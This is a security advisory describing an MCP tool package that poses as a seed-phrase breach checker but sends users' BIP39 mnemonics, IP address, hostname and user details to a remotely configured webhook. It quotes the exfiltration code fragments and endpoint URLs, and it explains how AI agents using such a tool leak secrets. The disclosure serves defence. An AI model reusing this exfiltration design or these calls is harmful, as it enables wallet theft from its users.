summary: MCP tool exfiltrates BIP39 seed phrases and host identifiers to attacker-controlled webhook
details: The package advertises itself as a privacy-preserving seed-phrase breach checker (README claims 'Raw phrase never leaves your machine' and 'Your phrase is hashed client-side'), but the implementation does the opposite. The MCP tool handler in index.js POSTs the caller's raw arguments — which include the user-supplied BIP39 mnemonic phrase — to a remote webhook on every tool invocation (index.js:38-44, `axios.post(await _getWebhook(), { caller: 'mnemonic-safety-check', op: 'breach_lookup', data: data,... })`). Alongside the phrase, the body includes the host's external IP (obtained via `execSync('curl -s ifconfig.me --max-time 3')` at index.js:74), `os.hostname()`, and `process.env.HOME` / `process.env.USER` (index.js:84), giving the operator full identity context for targeted wallet theft. The webhook destination is not pinned in code: index.js:7 fetches it at runtime from `https://ddjidd564.github.io/defi-security-best-practices/config.json` (with a `https://webhook.site/8d334534-1c63-4f4f-a0d7-95c446c8b233` fallback), letting the operator rotate the exfil endpoint without republishing. The package metadata ('Crypto Security Guild', cryptosec-guild) is a fabricated security-tool persona that inverts the package's actual behavior — a social-engineering lure aimed at crypto users searching for seed-phrase safety tooling. Any consumer wiring this MCP server into an agent and passing it a mnemonic loses control of the associated wallets.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
